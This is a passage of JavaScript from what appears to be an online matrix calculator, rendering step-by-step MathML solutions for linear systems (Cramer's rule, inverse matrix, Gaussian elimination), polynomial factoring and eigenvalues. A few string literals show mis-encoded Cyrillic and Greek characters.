  mstr += '</ul>';
  mstr += '<ul class="list-unstyled">';

  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    mstr += "<math>";
    mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions);
    var deltaI = new NonSimplifiedExpression(d[i]).divide(new NonSimplifiedExpression(D0));
    var deltaISimplified = deltaI.simplify();
    mstr += "<mo>=</mo>" + "<mrow><msub><mi>Î”</mi>" + Expression.p(i + 1) + "</msub><mo>&#x2215;</mo><mi>Î”</mi></mrow>";
    mstr += "<mo>=</mo>" + deltaI.toMathML(printOptions);

    if (deltaI.toString() !== deltaISimplified.toString()) {
      //?
      mstr += "<mo>=</mo>" + deltaISimplified.toMathML(printOptions);
    }

    mstr += "</math>";
    mstr += "</li>";
  }

  mstr += "</ul>";
  mstr += "<div>" + i18n.systems.answer + "</div>";
  mstr += '<ul class="list-unstyled">';

  for (var i = 0; i < m.cols(); i += 1) {
    mstr += "<li>";
    mstr += "<math>";
    mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions) + "<mo>=</mo>" + d[i].divide(D0).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</li>";
  }

  mstr += '</ul>'; //TODO: ? use cases ? t*x=t - ?

  var condition = Condition.TRUE.andNotZero(D0);

  if (!condition.isTrue()) {
    mstr += "<div>";
    mstr += "<math>";
    mstr += "<mrow><mo>(</mo>";
    mstr += condition.toMathML(printOptions);
    mstr += "<mo>)</mo></mrow>";
    mstr += "</math>";
    mstr += "</div>";
  } //TODO: some text about solution when !condition.isFalse()


  return mstr;
}; // SLE solution with inverse matrix


var solveUsingInverseMatrixMethod = function (printOptions, fullMatrix, variableNames) {
  if (fullMatrix.cols() < 2) {
    throw new RangeError("ValueMissingError:A-textarea"); //TODO: fix
  } //TODO: use variableNames (?)


  var m = Matrix.trimRight(fullMatrix.slice(0, fullMatrix.rows(), 0, fullMatrix.cols() - 1));
  var b = fullMatrix.slice(0, fullMatrix.rows(), fullMatrix.cols() - 1, fullMatrix.cols());
  var mstr = "";
  var c = undefined;

  if (!m.isSquare()) {
    throw new RangeError("NonSquareMatrixException:" + i18n.systems.toSolveSystemByInverseMatrixMethodNumberOfEquationsShouldBeEqualNumberOfVariables);
  }

  try {
    c = m.inverse();
  } catch (error) {
    if (error instanceof RangeError && error.message.indexOf("SingularMatrixException") === 0) {//mstr = i18n.systems.toSolveSystemByInverseMatrixMethodCoefficientMatrixShouldHaveNonZeroDeterminant;
    } else {
      throw error;
    }
  }

  mstr += "<h4>" + i18n.systems.solutionByInverseMatrixMethod + "</h4>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mrow><mi>A</mi><mo>&sdot;</mo><mi>X</mi></mrow><mo>=</mo><mi>B</mi>";
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>A</mi><mo>=</mo>" + new Expression.Matrix(m).toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";
  mstr += "<div>";
  mstr += "<math>";
  mstr += "<mi>B</mi><mo>=</mo>" + new Expression.Matrix(b).toMathML(printOptions);
  mstr += "</math>";
  mstr += "</div>";

  if (c != undefined) {
    mstr += "<div>";
    mstr += "<math>";
    mstr += "<msup><mi>A</mi><mrow><mo>&minus;</mo>" + Expression.p(1) + "</mrow></msup><mo>=</mo>" + new Expression.Matrix(c).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</div>";
    mstr += createDetailsSummary(printOptions.idPrefix, [{
      type: m.getDeterminantEventType("inverse").type,
      matrix: m.toString(),
      second: undefined
    }]);
    mstr += "<div>";
    mstr += "<math>"; //TODO: multiplicaiton details (?)

    mstr += "<mi>X</mi><mo>=</mo><mrow><msup><mi>A</mi><mrow><mo>&minus;</mo>" + Expression.p(1) + "</mrow></msup><mo>&sdot;</mo><mi>B</mi></mrow><mo>=</mo><mrow>" + new Expression.Matrix(c).toMathML(printOptions) + "<mo>&sdot;</mo>" + new Expression.Matrix(b).toMathML(printOptions) + "</mrow><mo>=</mo>" + new Expression.Matrix(c.multiply(b)).toMathML(printOptions);
    mstr += "</math>";
    mstr += "</div>";
  } else {
    mstr += i18n.systems.toSolveSystemByInverseMatrixMethodCoefficientMatrixShouldHaveNonZeroDeterminant;
    mstr += createDetailsSummary(printOptions.idPrefix, [{
      type: m.getDeterminantEventType("inverse").type,
      matrix: m.toString(),
      second: undefined
    }]);
    mstr += "<div class=\"for-details\"></div>";
  }

  return mstr;
}; //----------Gauss
// getting row echelon form without columns swapping


Expression.rowReduceChangeToHTML = function (change, printOptions, containerId, k, stepCondition) {
  var multiplier = change.type === "reduce" ? change.oldMatrix.e(change.targetRow, change.pivotColumn).divide(change.oldMatrix.e(change.pivotRow, change.pivotColumn)) : undefined;
  var areBracketsRequired = change.type === "reduce" ? multiplier.getPrecedence(multiplier) !== Expression.ZERO.getPrecedence() : undefined; //? not simple

  var jT = "<code>" + localeString(change.targetRow + 1) + "</code>";
  var iT = "<code>" + localeString(change.pivotRow + 1) + "</code>";
  var tooltip = (change.type === "swap-negate" ? i18n.eliminationDetails.rowSwapNegate.replace(/\$\{\-1\}/g, "<math>" + "<mo>&minus;</mo>" + Expression.p(1) + "</math>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") + (change.type === "swap" ? i18n.eliminationDetails.rowSwap.replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") + (change.type === "divide" ? i18n.eliminationDetails.rowDivision.replace(/\$\{a\}/g, "<code>" + "<math>" + change.oldMatrix.e(change.pivotRow, change.pivotColumn).toMathML(printOptions) + "</math>" + "</code>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "") + (change.type === "reduce" ? i18n.eliminationDetails.rowSubtraction.replace(/\$\{a\}/g, "<code>" + "<math>" + (areBracketsRequired ? "<mrow><mo>(</mo>" : "") + multiplier.toMathML(printOptions) + (areBracketsRequired ? "<mo>)</mo></mrow>" : "") + "</math>" + "</code>").replace(/\$\{j\}/g, jT).replace(/\$\{i\}/g, iT) : "");
  var text = "";

  var cellId = function (k, i, j) {
    return containerId + "-" + k.toString() + "-" + i.toString() + "-" + j.toString();
  };

  var questionId = containerId + "-" + k.toString() + "-" + "question-mark";
  k += 1; //!

  for (var i = 0; i < change.oldMatrix.cols(); i += 1) {
    if (change.type === "reduce" || change.type === "divide") {
      var highlight = "<a class=\"a-highlight\" data-for=\"" + cellId(k, change.targetRow, i) + "\" data-highlight=\"" + "#" + cellId(k - 1, change.pivotRow, change.pivotColumn) + ", " + "#" + cellId(k - 1, change.targetRow, i) + ", " + (change.type === "reduce" ? "#" + cellId(k - 1, change.targetRow, change.pivotColumn) + ", " : "") + (change.type === "reduce" ? "#" + cellId(k - 1, change.pivotRow, i) + ", " : "") + "#" + cellId(k, change.targetRow, i) + "\"></a>";
      text += "<a class=\"a-tooltip\" data-for=\"" + cellId(k, change.targetRow, i) + "\" hidden>" + "<math>" + Expression.p("a_(" + (change.targetRow + 1) + "," + (i + 1) + ")=" + (change.type === "reduce" ? "(b-(c/a)*d)" : "(b*(1/a))") + "=r", {
        a: change.oldMatrix.e(change.pivotRow, change.pivotColumn),
        b: change.oldMatrix.e(change.targetRow, i),
        c: change.oldMatrix.e(change.targetRow, change.pivotColumn),
        d: change.oldMatrix.e(change.pivotRow, i),
        r: change.newMatrix.e(change.targetRow, i)
      }, printOptions) + "</math>" + "</a>" + highlight;
    } else if (change.type === "swap" || change.type === "swap-negate") {
      text += "<a class=\"a-highlight\" data-for=\"" + cellId(k, change.targetRow, i) + "\" data-highlight=\"" + "#" + cellId(k - 1, change.pivotRow, i) + ", " + "#" + cellId(k - 1, change.targetRow, i) + ", " + "#" + cellId(k, change.targetRow, i) + "\"></a>";
      text += "<a class=\"a-highlight\" data-for=\"" + cellId(k, change.pivotRow, i) + "\" data-highlight=\"" + "#" + cellId(k - 1, change.targetRow, i) + ", " + "#" + cellId(k - 1, change.pivotRow, i) + ", " + "#" + cellId(k, change.pivotRow, i) + "\"></a>";
    }
  }

  var M = new Expression.Matrix(change.oldMatrix);
  return "<span class=\"nowrap\">" + "<math>" + (printOptions._isDeterminant ? new Expression.Determinant(M) : M).toMathML(Object.assign({}, printOptions, {
    columnlines: printOptions.columnlines,
    cellIdGenerator: function (i, j) {
      return cellId(k - 1, i, j);
    },
    pivotCell: change.type === "swap" || change.type === "swap-negate" ? undefined : {
      i: change.pivotRow,
      j: change.pivotColumn
    }
  })) + "</math>" + "<span class=\"arrow-with-label\" data-custom-paint=\"arrow-with-label\" data-type=\"" + change.type + "\" data-start=\"" + change.pivotRow + "\" data-end=\"" + change.targetRow + "\">" + "<div class=\"arrow\" aria-label=\"" + (change.type === "swap" || change.type === "swap-negate" ? i18n.misc.swapLabelTitle : i18n.misc.labelTitle).replace(/\$\{x\}/g, change.pivotRow).replace(/\$\{y\}/g, change.targetRow) + "\">" + (change.type === "swap" || change.type === "swap-negate" || change.pivotRow < change.targetRow ? "<div class=\"arrow-head-bottom\"></div>" : "") + (change.type === "swap" || change.type === "swap-negate" || change.pivotRow > change.targetRow ? "<div class=\"arrow-head-top\"></div>" : "") + (change.type !== "divide" ? "<div class=\"arrow-line\"></div>" : "") + "</div>" + "<div class=\"label\">" + (change.type === "swap" ? "" : change.type === "swap-negate" ? "" : "<math>" + (change.type === "divide" ? "<mo>&times;</mo>" + "<mrow><mo>(</mo>" + Expression.ONE.divide(change.oldMatrix.e(change.targetRow, change.pivotColumn)).toMathML(printOptions) + "<mo>)</mo></mrow>" : "<mo>&times;</mo>" + "<mrow><mo>(</mo>" + multiplier.negate().toMathML(printOptions) + "<mo>)</mo></mrow>") + "</math>") + "</div>" + "</span>" + "</span>" + "<math>" + "<mpadded width=\"+0.8em\" lspace=\"+0.4em\">" + "<mover accent=\"true\">" + (printOptions._isDeterminant ? "<mo>=</mo>" : "<munder accentunder=\"true\">" + "<mo stretchy=\"false\">" + "~" + "</mo>" + (stepCondition.isTrue() ? "" : "<munder accentunder=\"true\">") + "<mrow>" + ((change.type === "swap-negate" ? "${i}<mo>&harr;</mo><mrow><mo>&minus;</mo>${j}</mrow>" : "") + (change.type === "swap" ? "${i}<mo>&harr;</mo>${j}" : "") + (change.type === "divide" ? "${j}<mo>&#x2215;</mo><mrow><mo>(</mo>${a}<mo>)</mo></mrow><mo>&rarr;</mo>${j}".replace(/\$\{a\}/g, change.oldMatrix.e(change.pivotRow, change.pivotColumn).toMathML(printOptions)) : "") + (change.type === "reduce" ? "<mrow>${j}<mo>&minus;</mo><mrow>${a}<mo>&sdot;</mo>${i}</mrow></mrow><mo>&rarr;</mo>${j}".replace(/\$\{a\}/g, (areBracketsRequired ? "<mrow><mo>(</mo>" : "") + (printOptions.isLUDecomposition != undefined ? "<mrow mathbackground=\"#80FF80\" mathcolor=\"#3C78C2\">" : "") + multiplier.toMathML(printOptions) + (printOptions.isLUDecomposition != undefined ? "</mrow>" : "") + (areBracketsRequired ? "<mo>)</mo></mrow>" : "")) : "")).replace(/\$\{j\}/g, getMatrixRowDenotation(change.targetRow + 1)).replace(/\$\{i\}/g, getMatrixRowDenotation(change.pivotRow + 1)) + "</mrow>" + (stepCondition.isTrue() ? "" : stepCondition.toMathML(printOptions)) + (stepCondition.isTrue() ? "" : "</munder>") + "</munder>" + "") + "<mtext>" + ( // Note: <a> is not allowed in <a>
  tooltip !== "" ? "<a class=\"question-icon-new\" id=\"" + questionId + "\">?</a><span class=\"a-tooltip\" data-for=\"" + questionId + "\" hidden>" + tooltip + "</span>" : "") + (text !== "" ? "<span hidden>" + text + "</span>" : "") + "</mtext>" + "</mover>" + "</mpadded>" + "</math>";
};

Expression.rowReductionGaussJordanMontante = function (matrix, method, usage, printOptions, resultCallback, flag0) {
  flag0 = flag0 == undefined ? false : flag0;
  var containerId = printOptions.idPrefix + "-" + Expression.id();
  var html = "";
  var k = 0;
  html += "<div class=\"math-block\">";

  var outputTailMatrix = function (stoppedAtRow, matrix) {
    html += "<math>";
    html += new Expression.Matrix(matrix).toMathML(Object.assign({}, printOptions, {
      cellIdGenerator: function (i, j) {
        return containerId + "-" + k.toString() + "-" + i.toString() + "-" + j.toString();
      },
      highlightRow: stoppedAtRow
    }));
    html += "</math>";
    html += "</div>";
    k += 1;
  }; //2017-01-04:


  var oldCondition = Condition.TRUE; //---

  var result = matrix.toRowEchelonXXX(method, usage, function (change) {
    //2017-09-29:
    var stepCondition = Condition.TRUE;

    if (usage !== "determinant" && usage !== "inverse") {
      // not a "determinant" or a "inverse" calculation
      //2017-01-04:
      var pivot = change.oldMatrix.e(change.pivotRow, change.pivotColumn);
      stepCondition = Condition.TRUE.andNotZero(pivot);

      if (!stepCondition.isTrue()) {
        //?
        oldCondition = oldCondition.andNotZero(pivot);
      }
    } //---
    // TODO: remove stepCondition - ?


    var rowReduceChangeToHTML = method === Matrix.GaussMontante ? Expression.rowReduceChangeToHTMLMontante : Expression.rowReduceChangeToHTML;
    html += rowReduceChangeToHTML(change, printOptions, containerId, k, stepCondition);
    k += 1;
  }, usage !== "determinant" && usage !== "inverse" && !flag0 ? Condition.TRUE : undefined);

  var w = function (result) {
    if (result.c1 == undefined && result.c2 == undefined) {
      outputTailMatrix(result.stoppedAtRow, result.matrix);
      html += resultCallback({
        matrix: result.matrix,
        stoppedAtRow: result.stoppedAtRow,
        condition: flag0 ? oldCondition : result.condition // TODO: use or remove ?

      });
    } else {
      outputTailMatrix(-1, result.matrix);
      html += "<ol>";
      html += "<li>";
      html += "<div>";
      html += "<math>";
      html += result.c1.toMathML(printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      w(result.a1());
      html += "</li>";
      html += "<li>";
      html += "<div>";
      html += "<math>";
      html += result.c2.toMathML(printOptions);
      html += "</math>";
      html += "</div>";
      html += "<div>";
      w(result.a2());
      html += "</li>";
      html += "</ol>";
    }
  };

  w(result);
  return html;
};

Expression.solveByGaussNext = function (ms, printOptions, variableNames) {
  var condition = ms.condition; //?

  var m = ms.matrix; //!?

  if (condition != undefined) {
    m = m.map(function (e, i, j) {
      //return condition.andNotZero(e).isFalse() ? Expression.ZERO : e;
      return condition.updateExpression(e, {
        flag1: true
      });
    });
  } // 1. Throwing of null strings - they will be below, but checking: if we find a zero, which at the end has a non-zero, then there are no solutions!;


  var noSolutions = ms.stoppedAtRow !== -1; //!hack

  if (variableNames == undefined) {
    variableNames = makeDefaultVariableNames(m.cols() - 1);
  }

  if (noSolutions) {
    return {
      html: "<div>" + "<math>" + outSystem(printOptions, m, variableNames) + "</math>" + "</div>" + "<div>" + i18n.systems.thereAreNoSolutions + "</div>"
    };
  }

  var isHomogeneous = function (m) {
    for (var i = 0; i < m.rows(); i += 1) {
      if (!m.e(i, m.cols() - 1).equals(Expression.ZERO)) {
        return false;
      }
    }

    return true;
  }; // (?) TODO: allow users to specify "free" variables


  var containerId = printOptions.idPrefix + "-" + Expression.id();
  var systemId = containerId + "-" + "system_1";
  var mstr = "";

  if (!m.eql(Matrix.Zero(m.rows(), m.cols()))) {
    mstr += "<div class=\"anchor\" id=\"" + systemId + "\">" + "<table role=\"presentation\" class=\"system-table\">" + "<tr>" + "<td>" + "<math>" + outSystem(printOptions, m, variableNames) + "</math>" + "</td>" + "<td>" + "<a href=\"#" + systemId + "\">(" + localeString(1) + ")</a>" + "</td>" + "</tr>" + "</table>" + "</div>";
  }

  var isEquals = function (a, b) {
    if (a.length !== b.length) {
      return false;
    }

    for (var i = 0; i < a.length; i += 1) {
      if (!(a[i] instanceof NonSimplifiedExpression) || !(b[i] instanceof NonSimplifiedExpression)) {
        throw new TypeError();
      }

      if (!a[i].e.equals(b[i].e)) {
        // comparision without "simplification"
        return false;
      }
    }

    return true;
  };

  var nsVariableNames = new Array(m.cols() - 1);

  for (var i = 0; i < m.cols() - 1; i += 1) {
    nsVariableNames[i] = new NonSimplifiedExpression(new Expression.Symbol(variableNames[i]));
  }

  mstr += "<ul>";
  m = Matrix.solveByGaussNext(m, function (m, oldMatrix1, oldMatrix2, i, j) {
    //?
    //if (condition != undefined) {
    //condition = condition.andNotZero(oldMatrix1.e(i, j));
    //}
    //?
    mstr += "<li>";
    mstr += "<div>";
    mstr += i18n.systems.fromEquationIFindVariable.replace(/\$\{i\}/g, "<math>" + Expression.p(i + 1) + "</math>").replace(/\$\{x\}/g, "<math>" + new Expression.Symbol(variableNames[j]).toMathML(printOptions) + "</math>").replace(/\$\{#system_1\}/g, "<a href=\"#" + systemId + "\">(" + localeString(1) + ")</a>");
    mstr += "</div>";
    mstr += "<div>"; // We need to wrap using NonSimplifiedExpression to use in `isEquals`

    var equationSymbols1 = new Array(m.cols() - 1);
    var equationSymbols2 = new Array(m.cols() - 1);

    for (var k = 0; k < m.cols() - 1; k += 1) {
      var v = new NonSimplifiedExpression(nsVariableNames[k].e);
      equationSymbols1[k] = v;
      equationSymbols2[k] = v;

      if (k > j && !oldMatrix1.e(i, k).equals(Expression.ZERO)) {
        var pivotRowK = Matrix.getPivotRow(oldMatrix1, k);
        var y = pivotRowK === -1 ? v : new NonSimplifiedExpression(polynomialToExpression3(oldMatrix1, pivotRowK, nsVariableNames));
        equationSymbols2[k] = y;
      }
    }

    mstr += "<math>";
    var leftPartCoefficient = oldMatrix1.e(i, j);
    var leftPartVariable = new Expression.Symbol(variableNames[j]);
    var leftPart = leftPartCoefficient.equals(Expression.ONE) ? leftPartVariable : new Expression.Multiplication(leftPartCoefficient, leftPartVariable);
    mstr += leftPart.toMathML(printOptions);
    mstr += "<mo>=</mo>";
    var beforeSubstitution = polynomialToExpression3(oldMatrix1, i, equationSymbols1).toMathML(Object.assign({}, printOptions, {
      printId: true
    }));
    mstr += beforeSubstitution;
    var afterSubstitution = polynomialToExpression3(oldMatrix1, i, equationSymbols2).toMathML(Object.assign({}, printOptions, {
      printId: true
    }));

    if (!isEquals(equationSymbols1, equationSymbols2)) {
      mstr += "<mo>=</mo>";
      mstr += afterSubstitution;
    }

    var afterSimplification = polynomialToExpression3(oldMatrix2, i, nsVariableNames).toMathML(printOptions);

    if (!isEquals(equationSymbols2, nsVariableNames)) {
      mstr += "<mo>=</mo>";
      mstr += afterSimplification;
    }

    mstr += "</math>";
    mstr += "<div hidden>";

    for (var k = 0; k < nsVariableNames.length; k += 1) {
      if (!equationSymbols2[k].e.equals(nsVariableNames[k].e)) {
        mstr += "<a class=\"a-highlight\" data-for=\"" + equationSymbols2[k].getId() + "\" data-highlight=\"" + equationSymbols1[k].getId() + "\"></a>";
      }
    }

    mstr += "</div>";
    var afterDivision = polynomialToExpression3(m, i, nsVariableNames).toMathML(printOptions);

    if (!oldMatrix2.e(i, j).equals(Expression.ONE)) {
      mstr += "<div>"; //mstr += "<b>"; // does not work in Firefox 52 (Windows XP) with MathML

      mstr += "<math>";
      mstr += "<mrow style=\"font-weight: bolder\">";
      mstr += new Expression.Symbol(variableNames[j]).toMathML(printOptions);
      mstr += "<mo>=</mo>";
      mstr += afterDivision;
      mstr += "</mrow>";
      mstr += "</math>"; //mstr += "</b>";

      mstr += "</div>";
    }

    mstr += "</div>";
    mstr += "</li>";
  });
  mstr += "</ul>";
  var solutionsExpressions = new Array(m.cols() - 1);

  for (var i = 0; i < m.cols() - 1; i += 1) {
    solutionsExpressions[i] = Matrix.getPivotRow(m, i) === -1 ? nsVariableNames[i] : new NonSimplifiedExpression(polynomialToExpression3(m, Matrix.getPivotRow(m, i), nsVariableNames));
  }

  var solutionsExpressionsData = new Array(1);
  solutionsExpressionsData[0] = solutionsExpressions;
  var solutionsExpressionsMatrix = new Matrix(solutionsExpressionsData).transpose();

  if (true) {
    mstr += "<div>" + i18n.systems.answer + "</div>";

    if (condition != undefined && !condition.isTrue()) {
      mstr += "<div class=\"like-table\">";
    }

    mstr += "<ul class=\"list-unstyled\">";

    for (var i = 0; i < m.cols() - 1; i += 1) {
      mstr += "<li>";
      mstr += "<math>";
      mstr += new Expression.Symbol(variableNames[i]).toMathML(printOptions) + "<mo>=</mo>" + solutionsExpressions[i].toMathML(printOptions);
      mstr += "</math>";
      mstr += "</li>";
    }

    mstr += "</ul>"; //?

    if (condition != undefined && !condition.isTrue()) {
      mstr += "<math>";
      mstr += "<mrow><mo>(</mo>";
      mstr += condition.toMathML(printOptions);
      mstr += "<mo>)</mo></mrow>";
      mstr += "</math>";

      if (typeof hit === "function") {
        hit({
          condition: condition.toString() + "::" + m.toString()
        });
      }

      mstr += "</div>";
    } //?

  }

  if (true) {
    //TODO: remove - ?
    mstr += "<div>" + i18n.systems.generalSolution + " " + "<math>" + "<mi>X</mi><mo>=</mo>" + new Expression.Matrix(solutionsExpressionsMatrix).toMathML(printOptions) + "</math>" + "</div>";
  }

  if (isHomogeneous(m)) {
    var solutionSet = Matrix.getSolutionSet(m);

    if (solutionSet.basisVectors.length > 0) {
      var fundamentalSystemHTML = '';
      fundamentalSystemHTML += '<math>';
      fundamentalSystemHTML += '<mrow>';
      fundamentalSystemHTML += '<mo stretchy="false">{</mo>';
      fundamentalSystemHTML += solutionSet.basisVectors.length !== 1 ? '<mrow>' : '';

      for (var i = 0; i < solutionSet.basisVectors.length; i += 1) {
        var basisVector = new Expression.Matrix(solutionSet.basisVectors[i]);
        var freeVariable = nsVariableNames[solutionSet.variables[i]];
        fundamentalSystemHTML += i !== 0 ? '<mo>+</mo>' : '';
        fundamentalSystemHTML += '<mrow>' + freeVariable.toMathML(printOptions) + '<mo>&sdot;</mo>' + basisVector.toMathML(printOptions) + '</mrow>';
      }

      fundamentalSystemHTML += solutionSet.basisVectors.length !== 1 ? '</mrow>' : '';
      fundamentalSystemHTML += '<mo stretchy="false">}</mo>';
      fundamentalSystemHTML += '</mrow>';
      fundamentalSystemHTML += '</math>';
      mstr += '<div>' + i18n.systems.fundamentalSystem + ' ' + fundamentalSystemHTML + '</div>';
    }
  }

  return {
    html: mstr
  };
};

Expression.Details.add({
  type: "solve-using-Cramer's-rule",
  i18n: function () {
    return i18n.slu.solveByCrammer;
  },
  minRows: 1,
  callback: function (printOptions, matrix, variableNames) {
    return solveUsingCramersRule(printOptions, matrix, variableNames);
  }
});
Expression.Details.add({
  type: "solve-using-inverse-matrix-method",
  i18n: function () {
    return i18n.slu.solveByInverse;
  },
  minRows: 1,
  callback: function (printOptions, matrix, variableNames) {
    return solveUsingInverseMatrixMethod(printOptions, matrix, variableNames);
  }
}); //TODO: ?

Polynomial.toM1 = function (c, np, roots) {
  var e = undefined;

  if (!c.equals(Expression.ONE)) {
    if (!c.equals(Expression.ONE.negate())) {
      c = new NonSimplifiedExpression(c);
    }

    e = e != undefined ? new Expression.Multiplication(e, c) : c;
  }

  if (np.getDegree() === 0) {
    var x = np.getCoefficient(0);

    if (!x.equals(Expression.ONE)) {
      e = e != undefined ? new Expression.Multiplication(x, e) : x;
    }
  } //TODO: fix


  var multiplicity = 1;

  for (var i = 0; i < roots.length; i += 1) {
    var next = i < roots.length ? roots[i + 1] : null;

    if (roots[i] !== next) {
      var p = Polynomial.of(roots[i].negate(), Expression.ONE);
      var w = new Expression.Polynomial(p);

      if (multiplicity !== 1) {
        w = new Expression.Exponentiation(w, Expression.Integer.fromNumber(multiplicity));
      }

      e = e != undefined ? new Expression.Multiplication(e, w) : w;
      multiplicity = 1;
    } else {
      multiplicity += 1;
    }
  }

  if (roots.length === 0 || np.getDegree() !== 0) {
    //TODO: remove brackets
    var w = new Expression.Polynomial(np);
    e = e != undefined ? new Expression.Multiplication(e, w) : w; //html += "<mrow><mo>(</mo>" + np.toMathML(printOptions) + "<mo>)</mo></mrow>";
  }

  return e;
}; // -------------------------------------------- vectors -------------------------------------------


var polynomialRootsCallback = function (info, printOptions) {
  var result = "";
  var link = "";

  if (info.type === "useTheRationalRootTest") {
    link = i18n.useTheRationalRootTestLink;
  } else if (info.type === "solveQuadraticEquation") {
    link = i18n.solveQuadraticEquationLink;
  } else if (info.type === "solvePalindromicEquaion") {
    link = i18n.solvePalindromicEquaionLink;
  } else if (info.type === "(ax+b)**n") {
    link = i18n.binomialTheoremLink;
  } else if (info.type === "solveCubicEquation") {
    //?
    //TODO:
    link = i18n.solveCubicEquationLink;
  } else if (info.type === "solveQuarticEcuation") {
    //TODO: move
    link = i18n.solveQuarticEquationLink;
  } else if (info.type === "methodOfKronecker") {
    //?
    link = i18n.methodOfKroneckerLink;
  } else if (info.type === "applyDifferenceOfSquaresRule") {
    link = i18n.applyDifferenceOfSquaresRuleLink;
  } else if (info.type === "applyDifferenceOfCubesRule") {
    link = i18n.applyDifferenceOfCubesRuleLink;
  } else if (info.type === "applyDifferenceOfNthPowersRule") {
    link = i18n.applyDifferenceOfNthPowersRuleLink;
  } else if (info.type === "methodOfIntroducingANewVariable") {
    //TODO: ?
    link = '<math><mi>t</mi><mo>=</mo>' + info.t.toMathML() + '</math> - <a href="https://www.youtube.com/watch?v=_ou4r21swX4" title="ÐœÐµÑ‚Ð¾Ð´ Ð²Ð²ÐµÐ´ÐµÐ½Ð¸Ñ Ð½Ð¾Ð²Ð¾Ð¹ Ð¿ÐµÑ€ÐµÐ¼ÐµÐ½Ð½Ð¾Ð¹">(?)</a>';
  } else if (info.type === "factorOutTheGreatestCommonFactor") {//TODO: ?
  } else if (info.type === "solveLinearEquation") {
    return ""; //!?
  } else if (info.type === "squareFreeFactorization") {
    link = i18n.squareFreeFactorizationLink;
  } else if (info.type === "eliminationOfTheSubDominantTerm") {
    link = "https://en.wikipedia.org/wiki/Algebraic_equation#Elimination_of_the_sub-dominant_term"; //TODO: ?

    var title = "Elimination of the sub-dominant term"; //TODO: variable names

    var tmp = Expression.p("x=t-b/(n*a)", {
      b: info.b,
      n: Expression.Integer.fromNumber(info.n),
      a: info.a
    }, printOptions);
    result = '<munder accentunder="true"><mo>=</mo><munder accentunder="true"><mrow>' + tmp + '</mrow><mtext><a href="' + link + '" title="' + title + '">(?)</a></mtext></munder></munder>';
  } else if (info.type === "realRootIsolationAndNewton'sMethod") {
    //TODO: "Ð˜ÑÐ¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ Ñ‡Ð¸ÑÐ»ÐµÐ½Ð½Ñ‹Ðµ Ð¼ÐµÑ‚Ð¾Ð´Ñ‹ (Ð¼ÐµÑ‚Ð¾Ð´ Ð½Ð° Ð¾ÑÐ½Ð¾Ð²Ðµ Ð¿Ñ€Ð°Ð²Ð¸Ð»Ð° Ð·Ð½Ð°ÐºÐ¾Ð² Ð”ÐµÐºÐ°Ñ€Ñ‚Ð° Ð¸ Ð¼ÐµÑ‚Ð¾Ð´ ÐÑŒÑŽÑ‚Ð¾Ð½Ð°)"
    //TODO: what about complex roots - ?
    link = i18n.realRootIsolationAndNewtonsMethod;
    link = '<span style="max-width:9em;max-width:min-content;display:block;min-width:5em;">' + link + '</span>';
    result = link === "" ? "<mo>&asymp;</mo>" : "<munder accentunder=\"true\"><mo>&asymp;</mo><mtext>" + link + "</mtext></munder>";
  } else {
    //?
    //TODO: fix
    if (info.type !== "t = x^g") {
      console.assert(false);
    }
  }

  if (result === "") {
    if (info.type === "t = x^g" || link === "" && (info.type === "applyDifferenceOfSquaresRule" || info.type === "applyDifferenceOfCubesRule" || info.type === "applyDifferenceOfNthPowersRule")) {
      var variableName = printOptions.polynomialVariable;
      result += "<munder accentunder=\"true\"><mo>=</mo><mrow><mi>t</mi><mo>=</mo><msup><mi>${x}</mi><mn>${g}</mn></msup></mrow></munder>".replace(/\$\{x\}/g, variableName).replace(/\$\{g\}/g, localeString(info.g));
    } else {
      result += link === "" ? "<mo>=</mo>" : "<munder accentunder=\"true\"><mo>=</mo><mtext>" + link + "</mtext></munder>";
    }
  }

  result += Polynomial.toM1(info.content, info.newPolynomial, info.roots).toMathML(Object.assign({}, printOptions, info.newPolynomialVariable != undefined ? {
    polynomialVariable: info.newPolynomialVariable
  } : {}));
  return result;
};

Expression.getEigenvaluesWithSteps = function (printOptions, matrix) {
  var variableName = "Î»";
  var lambda = new Expression.Symbol(variableName);
  printOptions = Object.assign({}, printOptions, {
    polynomialVariable: lambda
  });
  var characteristicPolynomial = null;
  var steps = "";
  var eigenvalues = Expression.getEigenvalues(matrix, function (info) {
    if (characteristicPolynomial == null) {
      characteristicPolynomial = info;
    } else {
      steps += polynomialRootsCallback(info, printOptions);
    }
  }); //?

  var html = ""; //TODO: improve i18n (links to Wikipedia)

  var matrixWithLambdas = matrix.map(function (element, i, j) {
    return new NonSimplifiedExpression(i === j ? new Expression.Addition(new NonSimplifiedExpression(element), new Expression.Negation(lambda)) : element);
  });
  var args = {
    v: new Expression.MatrixSymbol('v'),
    A: new Expression.MatrixSymbol('A')
  };

  var mathml = function (s) {
    return s.replace(/\$\{([^\}]+)\}/g, function (p, s) {
      return '<math' + (/[\*\-]/.test(s) ? ' display="block"' : '') + '>' + Expression.p(s.replace(/I/g, i18n.identityMatrixDenotation), args, {}) + '</math>';
    });
  };

  html += "<div>";
  html += mathml(i18n.eigenvalues.byDefinition);
  html += "</div>";
  html += "<div>";
  html += i18n.exponential.then;
  html += mathml("${A*v-Î»*v=(A-Î»I)*v=0}");
  html += "</div>";
  html += "<div>";
  html += mathml(i18n.eigenvalues.equationHasNonZeroSolution);
  html += "</div>"; //html += "<div>";
  //html += i18n.eigenvalues.findEigenvaluesFromTheCharacteristicPolynomial;
  //html += "</div>";

  html += "<div>";
  html += "<math>";
  html += Expression.p("|(A-Î»I)|".replace(/I/g, i18n.identityMatrixDenotation), args, {});
  html += "<mo>=</mo>";
  html += new Expression.Determinant(new Expression.Matrix(matrixWithLambdas)).toMathML(printOptions) + "<mo>=</mo>" + characteristicPolynomial.toMathML(printOptions);
  html += steps;
  html += "<mo>=</mo>";
  html += Expression.p(0);
  html += "</math>";
